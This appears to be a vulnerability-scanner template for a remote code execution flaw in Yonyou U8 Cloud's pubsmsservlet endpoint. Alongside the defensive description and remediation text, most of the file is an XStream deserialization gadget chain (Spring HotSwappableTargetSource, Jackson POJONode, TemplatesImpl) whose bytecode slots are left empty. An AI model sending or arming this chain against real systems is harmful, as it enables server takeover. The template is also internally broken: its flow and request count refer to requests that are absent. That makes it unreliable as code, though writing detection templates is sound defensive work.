id: u8cloud-pubsmsservlet-rce
info:
  name: 用友 U8 Cloud pubsmsservlet 接口 - 远程代码执行漏洞
  author: Chaitin
  severity: critical
  description: |
    该模板用于检测 用友 U8 Cloud pubsmsservlet 接口 - 远程代码执行漏洞。该类漏洞通常与危险接口暴露、命令参数拼接、模板解析、反序列化或组件缺陷有关，攻击者可能让服务端执行非预期代码。模板会向 `/service/pubsmsservlet`、`/a2b1f0452c87c11e.txt` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可在目标服务权限范围内执行命令或代码，进而接管应用所在主机。
    - 成功利用后可能泄露配置、密钥和业务数据，并为横向移动、持久化控制或破坏业务提供入口。
  remediation: |
    - 升级受影响产品或组件到厂商修复版本，移除存在已知缺陷的依赖。
    - 限制高危接口的公网访问，增加认证、授权和来源校验，并避免将用户输入传入命令执行、模板解析或反序列化流程。
    - 排查异常进程、计划任务、WebShell、外联连接和新增账号，必要时轮换凭据并重建受影响环境。
  metadata:
    verified: true
    max-request: 3
    vendor: yonyou
    product: u8cloud
  tags: rce,vuln,u8cloud,yonyou
flow: (http(1) && http(3)) || (http(2) && http(3))
http:
  - method: POST
    path:
      - '{{BaseURL}}/service/pubsmsservlet'
    headers:
      Content-Type: application/xml
    body: |-
      <map>

      <entry>


      <org.springframework.aop.target.HotSwappableTargetSource>



      <target class="com.fasterxml.jackson.databind.node.POJONode">




      <__value class="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl" serialization="custom">





      <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>






      <default>







      <__name>a</__name>







      <__bytecodes>








      <byte-array></byte-array>








      <byte-array></byte-array>







      </__bytecodes>







      <__transletIndex>0</__transletIndex>







      <__indentNumber>0</__indentNumber>






      </default>






      <boolean>false</boolean>





      </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>




      </__value>



      </target>


      </org.springframework.aop.target.HotSwappableTargetSource>


      <org.springframework.aop.target.HotSwappableTargetSource reference="../org.springframework.aop.target.HotSwappableTargetSource"/>

      </entry>

      <entry>


      <org.springframework.aop.target.HotSwappableTargetSource>



      <target class="com.sun.org.apache.xpath.internal.objects.XStringForFSB">




      <m__start>0</m__start>




      <m__length>0</m__length>




      <m__hash>0</m__hash>



      </target>


      </org.springframework.aop.target.HotSwappableTargetSource>


      <org.springframework.aop.target.HotSwappableTargetSource reference="../org.springframework.aop.target.HotSwappableTargetSource"/>

      </entry>
      </map>
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body, "TranFlag")'
